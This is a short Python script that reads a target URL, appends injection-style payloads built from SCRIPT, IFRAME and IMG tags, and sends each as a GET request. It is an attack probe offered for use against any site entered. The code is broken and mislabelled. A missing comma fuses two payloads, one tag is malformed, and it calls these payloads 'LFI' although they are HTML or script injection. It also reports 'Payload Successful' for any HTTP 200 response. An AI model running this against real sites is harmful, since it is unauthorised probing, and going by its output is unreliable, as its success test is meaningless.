import requests
from colorama import Fore

site_url = input(Fore.YELLOW + "URL: ")

payloads = [
    "<SCRIPT SRC='http//google.com'",
    "<IFRAME SRC='yoursite.com'"
    "<IMG SRC='trendyol.com'>"
]

for payload in payloads:
    full_url = site_url + payload
    response = requests.get(full_url)

    if response.status_code == 200:
        print(Fore.GREEN + f"{Fore.GREEN}LFI Payload Successful: {full_url}")
    else:
        print(Fore.RED + f"{Fore.RED}Payload Unsuccessful: {full_url}")
